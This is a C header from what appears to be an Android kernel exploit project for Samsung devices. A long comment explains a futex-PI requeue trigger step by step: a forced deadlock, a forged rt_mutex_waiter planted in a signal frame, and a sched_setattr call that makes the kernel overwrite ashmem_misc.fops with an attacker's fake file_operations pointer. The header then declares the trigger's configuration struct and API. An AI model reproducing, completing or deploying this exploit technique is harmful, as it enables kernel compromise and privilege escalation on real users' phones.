/*
 * =============================================================================
 * FUTEX PI v14 POINTER-WRITE TRIGGER  -  NOT WIRED INTO ANY LIVE PATH
 * =============================================================================
 *
 * THIS MODULE IS INERT. There is no caller for futex_pi_v14_trigger() anywhere
 * in the tree, and none may be added as part of landing it. The live path still
 * runs the CFI stage in src/fops.c, which writes a fake file_operations and
 * performs a CFI dance; that stage panics the kernel on most boots (the device
 * reboots immediately after the log line "CFI owner read ret=8 value=0",
 * roughly 11 guard cycles earlier). The reference exploit has no CFI stage at
 * all: it mutates ashmem_misc.fops through this futex-PI v14 pointer-write
 * trigger, which is what buys it ~2 second, 20/20 runs.
 *
 * Cutover is deliberately a SEPARATE, REVIEWED step. This file exists so that:
 *   1. the trigger compiles and its device constants are auditable in one
 *      place (target.h, not here), and
 *   2. the CFI stage in src/fops.c stays untouched and reviewable.
 *
 * -----------------------------------------------------------------------------
 * WHAT IT DOES (four phases; every one is logged with rmg_diag(), which is the
 * only trace that survives a panic)
 * -----------------------------------------------------------------------------
 * Phase 0 - placement. Three roles on three DISTINCT cores, chosen with the
 *   src/core_ctl.h policy (capacity ranking + Samsung core_ctl filter +
 *   pin-and-verify). The reference hardcodes main=0, waiter=3, consumer=1; that
 *   is a literal, not a policy, and on F946B cpus 5/6 are exactly the cores
 *   core_ctl pauses. We share the Job-1 helper instead of re-implementing
 *   selection, and we verify each pin with sched_getcpu() before continuing.
 *
 * Phase 1 - the deadlock. Waiter takes FUTEX_LOCK_PI(pi_chain). Owner takes
 *   FUTEX_LOCK_PI(pi_target), then blocks on FUTEX_LOCK_PI(pi_chain). Waiter
 *   enters FUTEX_WAIT_REQUEUE_PI(wait, 0, timeout, pi_target). Main then issues
 *   FUTEX_CMP_REQUEUE_PI(wait, 1, 1 waiter, pi_target), which is expected to
 *   fail with EDEADLK because the requeue would close the pi chain. That
 *   EDEADLK is the signal that the kernel's requeue bookkeeping for the waiter
 *   is now in the intended, half-torn state; the waiter meanwhile has RETURNED
 *   from FUTEX_WAIT_REQUEUE_PI (on ETIMEDOUT) and publishes state = -1.
 *
 * Phase 2 - the arbitrary write. The waiter's SIGUSR1 handler walks the
 *   ARM64 sigcontext record list in its OWN signal frame, finds the
 *   struct fpsimd_context, and byte-copies a forged rt_mutex_waiter +
 *   rt_mutex_base into the record's vregs[] (exactly 0x200 bytes, so it cannot
 *   spill into fpsr/fpcr). The forged waiter's tree_entry.rb_right is the write
 *   target (ashmem_misc.fops) and its tree_entry.rb_parent_color is the
 *   replacement (our fake fops). Consumer opens the handshake gate first, so
 *   the payload is in place before anything else can observe the waiter.
 *
 * Phase 3 - the mutation boundary. ONLY after the consumer has observed the
 *   gate, and after the waiter has published state = 1, does the consumer mark
 *   the attempt mutation-pending and call sched_setattr(waiter_tid,
 *   SCHED_BATCH, nice) on the waiter. sched_setattr() -> __sched_setscheduler()
 *   -> rt_mutex_adjust_pi() (kernel/sched/core.c) -> rt_mutex_adjust_prio_chain()
 *   walks the forged PI/rb links. Nothing else runs on the consumer between the
 *   gate check and that syscall: no getenv, no atoi, no libc, no allocation.
 *   That emptiness is the whole point, so the delay is a precomputed cntvct
 *   spin resolved before any thread exists, and the results are stored into
 *   plain volatiles.
 *
 * WHAT IS DELIBERATELY NOT PORTED: the reference's v1..v13 routes, its
 * 1000-iteration legacy requeue poll loop, and its per-attempt `sleep(1)`
 * worker loops. Only the v14 route exists here.
 *
 * WHAT IS UNPROVEN: see the "UNPROVEN" section of the delivery notes. In short,
 * none of this has executed on a device, the whole trigger is timing-critical,
 * and the timing constants in target.h are the reference's S918B numbers,
 * not recalibrated for F946B.
 * =============================================================================
 */
#ifndef CVE43499_FUTEX_PI_V14_H
#define CVE43499_FUTEX_PI_V14_H

#include <stdint.h>

/*
 * Addresses of the reclaim-page objects the forged waiter must point at. They
 * are passed in rather than hardcoded because they are OUR payload page's
 * geometry (see FOPS_OFF / W0_OFF / FAKE_TASK_OFF / SCRATCH_OFF in target.h),
 * not reference-S918B geometry, and because the caller is the only place that
 * knows which reclaim page it is looking at.
 */
struct futex_pi_v14_config {
  /* Reclaimed payload page base. Used only for logging and for the fake
   * object addresses the caller did not supply. */
  uint64_t page_base;
  /* ashmem_misc.fops: the address the kernel must end up writing to. */
  uint64_t target_fops;
  /* Our fake file_operations: the pointer the kernel must publish. */
  uint64_t fake_fops;
  /* struct rt_mutex_base in the reclaim page: the lock the forged waiter's
   * ->lock points at, so the chain walk stays inside kernel memory. */
  uint64_t fake_lock;
  /* struct task_struct in the reclaim page: the forged waiter's ->task, whose
   * pi_lock/pi_waiters/pi_top_task/pi_blocked_on the chain walk then reads. */
  uint64_t fake_task;
  /* A self-referential rb root in the reclaim page: the forged waiter's
   * pi_tree_entry points at itself so the pi tree stays consistent. */
  uint64_t pi_waiters_self;
  /* A second fake task_struct in the reclaim page. */
  uint64_t signal_scratch;
  /* Optional shared attempt status. When non-NULL the consumer writes
   * pending_state immediately before the critical sched_setattr and
   * mutated_state immediately after, which is the mutation boundary the
   * reference uses to forbid retries. */
  int32_t *mutation_state;
  int32_t pending_state;
  int32_t mutated_state;
};

#define FUTEX_PI_V14_STEP_INIT 0
#define FUTEX_PI_V14_STEP_PLACED 1
#define FUTEX_PI_V14_STEP_DEADLOCK 2
#define FUTEX_PI_V14_STEP_GATE 3
#define FUTEX_PI_V14_STEP_PAYLOAD 4
#define FUTEX_PI_V14_STEP_MUTATION 5
#define FUTEX_PI_V14_STEP_DONE 6

/*
 * Run the whole choreography once. Returns 1 only if the mutation boundary was
 * crossed (i.e. sched_setattr was issued on the waiter after the gate), which
 * is the reference's notion of "triggered"; any other value means nothing
 * kernel-global was attempted and the caller may safely retry.
 *
 * Performs no device I/O beyond sysfs/syscall/log writes. Calling it from the
 * live path is a separate decision and is NOT authorised by landing this file.
 */
int futex_pi_v14_trigger(const struct futex_pi_v14_config *cfg);

/* Last step reached, one of the FUTEX_PI_V14_STEP_* values; -1 before the first
 * call. Diagnostics only. */
int futex_pi_v14_last_step(void);

/* Reason the SIGUSR1 handler last returned; 0 = not delivered, 1 = success,
 * -1 = failed. Diagnostics only. */
int futex_pi_v14_handler_result(void);

/* Human-readable form of the above, for rmg_diag lines. */
const char *futex_pi_v14_step_name(int step);

#endif
